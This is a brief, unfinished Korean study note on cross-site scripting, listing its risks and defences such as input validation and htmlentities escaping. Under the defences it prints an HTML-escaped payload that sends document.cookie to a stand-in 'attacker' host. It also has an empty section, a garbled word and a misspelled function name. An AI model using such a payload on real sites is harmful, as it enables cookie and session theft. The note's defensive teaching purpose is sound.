# Cross Site Scripting

## intro
외부 사용자가 사이트에 스크립트를 삽입하여 공격하는 방법.

## 기법


## 위험요소
1. 쿠키 정보 및 세션 ID 획득
2. 관리자 권한 획득
3. 악성코드 다운로드 유도
4. 거짓 페이지 놏ㄹ

## 방지법
1. 입력값 검증
2. htmlentitiess 사용
```
&lt;script&gt;document.write('img src=&quot;http://attacker.php?data='+escape(document.cookie)+'&quot; /&gt;')&lt;/script&gt;
```

```html
<?=htmlspecialchars(mysql_result($result,0,1))?>
```
3. 입력 필터
- 

https://kevinthegrey.tistory.com/36